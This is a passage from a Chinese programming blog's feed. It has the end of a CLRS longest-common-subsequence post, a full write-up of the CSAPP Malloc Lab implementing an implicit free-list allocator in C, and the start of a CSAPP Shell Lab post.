        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token string">'ABCBDAB'</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> <span class="token string">'BDCABA'</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
c<span class="token punctuation">,</span> b <span class="token operator">=</span> LCSLength<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> i<span class="token punctuation">:</span>
        <span class="token keyword">print</span> c<span class="token punctuation">,</span>
    <span class="token keyword">print</span>

PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>结果分别显示了c， b和最长公共子序列。</p>
<pre><code>[0, 0, 0, 0, 0, 0, 0]
[0, 0, 0, 0, 1, 1, 1]
[0, 1, 1, 1, 1, 2, 2]
[0, 1, 1, 2, 2, 2, 2]
[0, 1, 1, 2, 2, 3, 3]
[0, 1, 2, 2, 2, 3, 3]
[0, 1, 2, 2, 3, 3, 4]
[0, 1, 2, 2, 3, 4, 4]
0 0 0 0 0 0 0
0 ↑ ↑ ↑ ↖ ← ↖
0 ↖ ← ← ↑ ↖ ←
0 ↑ ↑ ↖ ← ↑ ↑
0 ↖ ↑ ↑ ↑ ↖ ←
0 ↑ ↖ ↑ ↑ ↑ ↑
0 ↑ ↑ ↑ ↖ ↑ ↖
0 ↖ ↑ ↑ ↑ ↖ ↑
B C B A
</code></pre>]]></content>
    
    <summary type="html">
    
      CLRS
    
    </summary>
    
    
      <category term="algorithm" scheme="http://xinqiu.me/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab6 解题分析</title>
    <link href="http://xinqiu.me/2016/08/11/csapp-lab6-malloclab/"/>
    <id>http://xinqiu.me/2016/08/11/csapp-lab6-malloclab/</id>
    <published>2016-08-10T16:00:00.000Z</published>
    <updated>2016-08-11T06:27:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Malloc Lab，据说是最难的一个lab。在看完第九章之后，因为要旅游，没有直接做lab，而是继续看书，结果回来了，书还剩1章，又顺势看完了剩余的部分。在整本书都读完了以后，才回过头来做Malloc Lab。</p>
<h3 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h3><p>需要完成<code>mm.c</code>里的内容，材料中需要完成的是</p>
<ul>
<li>int mm_init(void)</li>
<li>void *mm_malloc(size_t size)</li>
<li>void mm_free(void *ptr)</li>
</ul>
<p>其他的mm_realloc源码中已经填写好了。</p>
<p>这里，我是用书中的隐式空闲链表方法，先完成实验。</p>
<a id="more"></a>
<h4 id="mm_init"><a href="#mm_init" class="headerlink" title="mm_init"></a>mm_init</h4><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * mm_init - initialize the malloc package.
 */</span>
<span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>head_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head_listp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE<span class="token operator">/</span>WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这是一个初始化堆的函数。mm_init从内存中获取4个字的空间，并初始化城空闲链表。</p>
<p>其中堆块的形式是这样的</p>
<p><img src="2.png" alt=""></p>
<p>隐式空闲链表第一个字并没有用，这作为双字边界对齐的填充字。接着是prologue block，这和正常块的区别在于它没有payload，所以算是作为堆开始的标志，同样，epilogue block放在堆的结尾处。</p>
<p><img src="1.png" alt=""></p>
<p>上图为隐式空闲链表，每个regular block其实就上之前堆块图的结构。注意到蓝色的块是在初始化时产生的。mm_init就是做了以上的操作，首先调用mem_sbrk申请4个字的空间，首先第一个字填充为0。接着创建prologue block，因为prologue block是双字，也就是8-byte。接着创建epilogue block。接着将head_listp指针指向prologue block的结尾。虽然隐式空闲链表的头和尾都构建好了，但是没有分配空间给它，它限制并不能存任何东西。所以我们要对刚才的空闲链表进行扩展堆。默认扩展一个空堆CHUNKSIZE，这里定义的是1&lt;&lt;12也就是4K，4K也就是1000个字。</p>
<p>所以接着设计一个extend_heap函数。</p>
<h4 id="extend_heap"><a href="#extend_heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>size_t words<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>
    size_t size<span class="token punctuation">;</span>

    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token punctuation">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>要知道内存块都是存在一种对齐机制，所以当分配奇数字时，要进行双字对齐。接着和初始化一样，调用mem_sbrk来获取空间。之后的内容和之前的mm_init类似，将bp所指的块的header和footer赋值为0，表示这个块是空闲块。将下一个块的header构造成epilogue block。</p>
<p>这里说个小插曲，为什么要双字对齐。我觉得是因为将最后一位留出来标记这个块是否被分配。只要是双字对齐后，那么这个数的二进制数最后一位肯定为0， 所以置为1代表已分配，置0代表未分配。如果不对齐，那么如果分配的是奇数，最后一位本来就为1，但若这个块并未分配，所以会影响判断。</p>
<p>在扩展完这个块以后，需要将这个块和之前的块进行合并。如果之前的块为空闲，则合并成更大的块来满足空间申请的请求。</p>
<h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> bp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>
        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span> 
    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>合并块有4种可能的情况。</p>
<p><img src="3.png" alt=""></p>
<p>上面代码的顺序和上图的顺序是一致的。所谓合并，就是修改上一个或者下一个块的头和尾中的size。使之变成合并后的size。</p>
<h4 id="mm_free"><a href="#mm_free" class="headerlink" title="mm_free"></a>mm_free</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>释放块，其实就是将头和尾的标志位修改为0，然后将这个块与前一个块或者后一个块合并。</p>
<h4 id="mm_malloc"><a href="#mm_malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/*
    int newsize = ALIGN(size + SIZE_T_SIZE);
    void *p = mem_sbrk(newsize);
    if (p == (void *)-1)
    return NULL;
    else {
        *(size_t *)p = size;
        return (void *)((char *)p + SIZE_T_SIZE);
    }
    */</span>
    size_t asize<span class="token punctuation">;</span>
    size_t extendsize<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> DSIZE<span class="token punctuation">)</span>
        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize<span class="token operator">/</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这算是最主要的部分了。分配内存主要分为对齐，最适搜索， 扩展堆。</p>
<p>对齐这个不难明白，就是如果申请的大小不是双字对齐，需要将其对齐，虽然这样会产生碎片。另外，参考之前的空堆结构可知，申请的空间最小要是16字节。其中8个字节存放头和尾，8个字节满足对齐要求。在调整了请求大小后，开始搜索空闲链表，寻找合适的空闲块。如果有，就放这个请求块，没有就需要申请新的空闲块来扩展堆,然后再放这个块。</p>
<p>这里用到了两个函数，find_fit和place，接着就要来完善这两个函数。</p>
<h4 id="find_fit"><a href="#find_fit" class="headerlink" title="find_fit"></a>find_fit</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>   
    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>bp <span class="token operator">=</span> head_listp<span class="token punctuation">;</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>asize <span class="token operator">&lt;=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里是用首次适配搜索。从隐式空闲链表的开头开始，寻找首个合适的未分配的块。</p>
<h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t asize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t csize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>csize <span class="token operator">-</span> asize<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token operator">-</span>asize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token operator">-</span>asize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>若是寻找到了合适的块，这时就要将这个块放进去。这里有两种情况，如果当前找到的块比需要填入的块大于或等于16字节，证明这个块还能够分裂成两个块，所以需要做分裂操作。不然就直接将这个整个块标记为已分配，也就是说这里存在小于16字节的碎片。</p>
<h4 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h4><p>隐式空闲链表可能说稍微容易点，得分87/100，这就证明其中有能够优化的地方，比如书中提到的显示空闲链表和分离链表，有机会我会再试试其他的方法，更巧妙的比如BST或者splay伸展树等等。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab5 解题分析</title>
    <link href="http://xinqiu.me/2016/07/12/csapp-lab5-shelllab/"/>
    <id>http://xinqiu.me/2016/07/12/csapp-lab5-shelllab/</id>
    <published>2016-07-11T16:00:00.000Z</published>
    <updated>2016-07-19T12:16:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个实验是要实现一个简易的shell程序，主要考虑的是异常和信号的处理。</p>
<!--toc-->
<h4 id="u524D_u671F_u5DE5_u4F5C"><a href="#u524D_u671F_u5DE5_u4F5C" class="headerlink" title="前期工作"></a>前期工作</h4><p>解压缩<code>shlab-handout.tar</code>，执行<code>make clean | make</code>,就可以得到编译好的文件。</p>
<p>文件夹中的<code>tshref</code>是正确的结果，可以用来验证。与其用</p>
<pre><code>./sdriver.pl -t trace01.txt -s ./tsh -a &quot;-p&quot;
</code></pre><p>来测试，我觉得实验手册里提到的另一种方法更好用，</p>
<pre><code>make test01
</code></pre><p>这是对自己写的tsh进行测试，要想对tshref进行测试，只需要在后面的test前面添加一个<code>r</code>即可，也就是<code>make rtest01</code>。</p>
<a id="more"></a>
<h4 id="u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570"><a href="#u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570" class="headerlink" title="需要实现的函数"></a>需要实现的函数</h4><ul>
<li>void eval(char *cmdline) 执行用户输入的命令</li>
<li>int builtin_cmd(char **argv) 执行内部命令</li>
<li>void do_bgfg(char **argv) 执行bg和fg命令</li>
<li>void waitfg(pid_t pid) block进程直到它不再是前台进程</li>
<li>void sigchld_handler(int sig) SIGCHLD信号处理</li>
